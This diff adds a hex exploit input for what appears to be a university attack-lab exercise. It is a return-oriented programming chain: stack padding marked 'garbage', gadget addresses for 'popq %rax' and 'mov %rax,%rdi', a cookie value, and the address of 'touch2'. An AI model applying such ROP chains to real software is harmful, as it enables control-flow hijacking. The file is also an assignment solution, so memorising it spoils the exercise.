@@ -1,0 +1,9 @@
+c8 82 07 00 00 00 00 00 /* garbage */
+f4 00 00 00 00 00 00 00 /* garbage */
+30 62 f8 ff ff 7f 00 00 /* garbage */
+40 b6 b8 f7 ff 7f 00 00 /* garbage */
+00 00 00 00 00 00 00 00 /* garbage */
+cc 19 40 00 00 00 00 00 /* address of popq %rax */
+fa 97 b9 59 00 00 00 00 /* cookie */
+a2 19 40 00 00 00 00 00 /* address of mov %rax,%rdi */
+ec 17 40 00 00 00 00 00 /* address of touch2 */
